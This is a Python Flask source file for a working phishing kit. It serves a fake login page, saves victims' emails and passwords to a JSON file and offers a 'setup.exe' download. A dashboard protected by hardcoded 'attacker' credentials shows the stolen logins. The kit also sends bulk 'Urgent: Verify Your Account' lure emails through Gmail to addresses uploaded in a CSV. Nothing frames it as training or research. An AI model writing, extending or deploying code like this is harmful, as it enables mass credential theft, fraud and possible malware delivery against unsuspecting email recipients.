from flask import Flask, request, render_template, jsonify, send_from_directory, redirect, url_for, flash
import json
import os
import csv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
from functools import wraps
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # For flash messages
CREDENTIALS_FILE = 'credentials.json'
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'csv'}

# Ensure upload folder exists
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Hardcoded attacker credentials (for simplicity)
ATTACKER_USERNAME = 'admin'
ATTACKER_PASSWORD = 'phishing123'

# Initialize credentials file if missing or invalid
def initialize_credentials_file():
    if not os.path.exists(CREDENTIALS_FILE) or os.path.getsize(CREDENTIALS_FILE) == 0:
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump([], f)
    else:
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                json.load(f)  # Test if JSON is valid
        except json.JSONDecodeError:
            with open(CREDENTIALS_FILE, 'w') as f:
                json.dump([], f)  # Reset to empty array if invalid

# Call initialization on startup
initialize_credentials_file()

# Basic authentication decorator
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ATTACKER_USERNAME or auth.password != ATTACKER_PASSWORD:
            return 'Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'}
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def login_page():
    return render_template('index.html')

@app.route('/save-credentials', methods=['POST'])
def save_credentials():
    try:
        data = request.get_json()
        if not data or 'email' not in data or 'password' not in data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        credentials = []
        if os.path.exists(CREDENTIALS_FILE):
            with open(CREDENTIALS_FILE, 'r') as f:
                try:
                    credentials = json.load(f)
                except json.JSONDecodeError:
                    credentials = []  # Reset if JSON is invalid
        
        credentials.append(data)
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump(credentials, f, indent=2)
        
        print(f"Saved credentials: {data}")  # Debug log
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error saving credentials: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/downloads/setup.exe')
def download_file():
    return send_from_directory('static', 'setup.exe')

@app.route('/thankyou')
def thankyou_page():
    return render_template('thankyou.html')

@app.route('/credentials.json')
@require_auth
def get_credentials():
    try:
        with open(CREDENTIALS_FILE, 'r') as f:
            content = f.read()
            if not content.strip():  # Handle empty file
                return jsonify([])
            return jsonify(json.loads(content))
    except json.JSONDecodeError as e:
        print(f"JSON decode error in credentials.json: {e}")
        return jsonify([])  # Return empty array if JSON is invalid
    except FileNotFoundError:
        print(f"credentials.json not found")
        return jsonify([])  # Return empty array if file is missing
    except Exception as e:
        print(f"Error reading credentials.json: {e}")
        return jsonify([]), 500

@app.route('/dashboard')
@require_auth
def dashboard():
    return render_template('dashboard.html')

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/send-emails', methods=['GET', 'POST'])
@require_auth
def send_emails():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file uploaded')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No file selected')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            file.save(file_path)
            
            # Email configuration
            sender_email = "email"  # Replace with your email
            sender_password = "pass"  # Replace with your app-specific password
            phishing_url = "http://localhost:5000"  # Replace with your phishing site URL

            try:
                with open(file_path, newline='') as csvfile:
                    reader = csv.DictReader(csvfile)
                    if 'email' not in reader.fieldnames:
                        flash("CSV must contain an 'email' column")
                        return redirect(request.url)
                    for row in reader:
                        send_phishing_email(sender_email, sender_password, row['email'], phishing_url)
                flash('Emails sent successfully')
            except Exception as e:
                flash(f"Error sending emails: {e}")
            finally:
                os.remove(file_path)  # Clean up uploaded file
            return redirect(request.url)
    return render_template('send_emails.html')

def send_phishing_email(sender_email, sender_password, recipient_email, phishing_url):
    subject = "Urgent: Verify Your Account"
    body = f"""
    Dear User,
    We have detected unusual activity on your account. Please verify your credentials and follow the instruction in the following url.
    Click here to login: {phishing_url}
    Regards,
    Secure Portal Team
    """

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print(f"Email sent to {recipient_email}")
    except Exception as e:
        print(f"Failed to send email to {recipient_email}: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)